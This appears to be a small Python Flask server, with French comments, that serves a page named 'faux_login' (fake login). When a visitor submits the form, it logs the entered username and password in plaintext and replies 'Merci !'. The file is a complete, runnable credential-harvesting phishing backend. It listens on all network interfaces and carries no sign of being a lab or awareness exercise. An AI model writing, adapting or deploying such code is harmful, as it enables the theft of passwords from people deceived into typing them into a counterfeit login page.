from flask import Flask, render_template, request
import logging

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)

@app.route('/')
def index():
    return render_template('faux_login.html')  # Assure-toi que ce fichier existe dans `templates/`

@app.route('/faux_login', methods=['POST'])
def faux_login():
    identifiant = request.form.get('identifiant')
    mot_de_passe = request.form.get('mot_de_passe')
    logging.info(f"Identifiant : {identifiant}")
    logging.info(f"Mot de passe : {mot_de_passe}")
    return "Merci !"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
